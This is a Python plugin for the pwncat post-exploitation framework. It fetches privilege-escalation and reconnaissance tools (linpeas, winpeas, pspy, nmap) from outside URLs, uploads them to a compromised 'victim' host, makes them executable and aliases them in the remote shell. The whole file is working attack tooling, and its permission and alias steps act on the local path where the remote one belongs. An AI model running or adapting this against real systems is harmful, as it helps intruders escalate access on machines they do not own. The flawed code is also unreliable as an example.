#!/usr/bin/env python3
import os
import time

import requests
from rich.progress import (
    Progress,
    BarColumn,
    TextColumn,
    DownloadColumn,
    TimeRemainingColumn,
    TransferSpeedColumn,
)

import pwncat
from pwncat.util import console, copyfileobj, human_readable_size, human_readable_delta
from pwncat.commands import Complete, Parameter, CommandDefinition
from pwncat.platform import PlatformError


class Command(CommandDefinition):
    """
    Upload a program from the local host to the remote host.
    Before uploading the program will be downloaded to the attacker.
    Typicall programs are static binarys or shell scripts.
    """

    PROG = "upload_prog"
    DOWNLOAD_DIRECTORY = "/tmp/"
    DIR = {
        "pspy": "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",
        "linpeas": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
        "linpeas_fat": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh",
        "linpeas_small": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh",
        "winpeas": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
        "jq": "https://bin.pkgforge.dev/x86_64/jq",
        "openssl": "https://bin.pkgforge.dev/x86_64/openssl",
        "nmap": "https://bin.pkgforge.dev/x86_64/nmap",
    }
    ARGS = {
        "prog_name": Parameter(
            Complete.CHOICES,
            metavar="POSITIONAL",
            choices=DIR.keys(),
            help="help information",
        ),
        "destination": Parameter(
            Complete.REMOTE_FILE,
            nargs="?",
        ),
    }

    def _download_prog(self, program: str, progress: Progress = None):
        """Download a program with optional progress bar."""
        url = self.DIR[program]
        filename = os.path.join(self.DOWNLOAD_DIRECTORY, program)

        try:
            with requests.get(url, stream=True, timeout=10) as response:
                response.raise_for_status()
                total_size = int(response.headers.get("content-length", 0))

                if progress:
                    download_task = progress.add_task(
                        "[cyan]Downloading...",
                        filename=program,
                        total=total_size,
                    )
                    progress.start_task(download_task)

                with open(filename, "wb") as file:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            if progress:
                                progress.update(download_task, advance=len(chunk))

                if progress.finished:
                    progress.update(download_task, filename="Download completed!")
                    progress.stop_task(download_task)
                    console.log(
                        f"✅ Downloaded [cyan]{program}[/cyan] to attacker [green]{filename}[/green]"
                    )

        except requests.exceptions.RequestException as e:
            console.log(f"❌ Failed to download {program}: {e}")
            raise

    def run(self, manager: "pwncat.manager.Manager", args):

        # Create a progress bar for the download
        progress = Progress(
            TextColumn("[bold cyan]{task.fields[filename]}", justify="right"),
            BarColumn(bar_width=None),
            "[progress.percentage]{task.percentage:>3.1f}%",
            "•",
            DownloadColumn(),
            "•",
            TransferSpeedColumn(),
            "•",
            TimeRemainingColumn(),
        )

        self.program = os.path.join(self.DOWNLOAD_DIRECTORY, args.prog_name)
        self._download_prog(args.prog_name, progress)

        try:
            length = os.path.getsize(self.program)
            started = time.time()
            with progress:
                task_id = progress.add_task(
                    "upload",
                    filename=args.destination,
                    total=length,
                    start=False,
                )

                with open(self.program, "rb") as source:
                    with manager.target.platform.open(
                        args.destination,
                        "wb",
                    ) as destination:
                        progress.start_task(task_id)
                        copyfileobj(
                            source,
                            destination,
                            lambda count: progress.update(task_id, advance=count),
                        )
                progress.update(task_id, filename="draining buffers...")
                progress.stop_task(task_id)

                while not progress.finished:
                    time.sleep(0.02)
                    print("progress not finished")

            elapsed = time.time() - started
            console.log(
                f"✅ Uploaded [cyan]{human_readable_size(length)}[/cyan] "
                f"in [green]{human_readable_delta(elapsed)}[/green]",
                f"to victim [blue]{self.program}[/blue]",
            )

            manager.target.platform.chmod(
                self.program, 0o755
            )  # Rechte auf Opfermaschine setzen
            alias_cmd = f"alias {args.prog_name}='{self.program}'"
            manager.target.platform.run(
                alias_cmd, pty=True
            )  # # Alias in der aktuellen Shell setzen
        except (
            FileNotFoundError,
            PermissionError,
            IsADirectoryError,
            PlatformError,
        ) as exc:
            self.parser.error(str(exc))


# TODO
# make executable
# add to path
# check soar
